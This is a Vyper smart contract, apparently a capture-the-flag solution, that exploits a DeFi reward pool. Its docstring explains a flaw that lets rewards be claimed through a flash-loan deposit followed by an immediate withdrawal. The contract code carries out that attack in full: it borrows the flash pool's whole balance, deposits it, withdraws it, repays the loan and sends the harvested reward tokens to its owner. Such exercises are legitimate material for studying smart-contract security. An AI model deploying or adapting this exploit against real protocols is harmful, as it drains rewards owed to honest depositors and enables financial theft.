# @version ^0.3.7

"""
The vulnerability is that anyone can call `deposit()`, 
mint reward tokens and if it is a new rewards round, and 
then immediatly withdraw their initial deposit and keep the rewards.
An attacker can wait for a new rewards round and use the flash loaner
pool to deposit a large amount of tokens and therefore secure themself
a large portion of the rewards for the round, and then immediatly withdraw
the tokens to repay the flash loan.
"""

from vyper.interfaces import ERC20 as IERC20

interface IRewardPool:
    def isNewRewardsRound() -> bool: view
    def deposit(amount: uint256): nonpayable
    def withdraw(amount: uint256): nonpayable

owner: immutable(address)

rewarder_pool: IRewardPool
flash_pool: address
liq_token: address
reward_token: address

@external
@payable
def __init__(
    _rewarder_pool: IRewardPool,
    _flash_pool: address,
    _liq_token: address,
    _reward_token: address,
):
    owner = msg.sender
    self.rewarder_pool = _rewarder_pool
    self.flash_pool = _flash_pool
    self.liq_token = _liq_token
    self.reward_token = _reward_token

@external
def attack():
    assert msg.sender == owner, "!owner"
    assert self.rewarder_pool.isNewRewardsRound(), "!exploit time"
    amount: uint256 = IERC20(self.liq_token).balanceOf(self.flash_pool)
    raw_call(
        self.flash_pool,
        _abi_encode(
            amount,
            method_id=method_id("flashLoan(uint256)")
        )
    )
    IERC20(self.reward_token).transfer(
        msg.sender,
        IERC20(self.reward_token).balanceOf(self),
    )

@external
def receiveFlashLoan(amount: uint256):
    assert msg.sender == self.flash_pool, "!flash_pool"
    IERC20(self.liq_token).approve(self.rewarder_pool.address, amount)
    self.rewarder_pool.deposit(amount)
    self.rewarder_pool.withdraw(amount)
    IERC20(self.liq_token).transfer(msg.sender, amount)
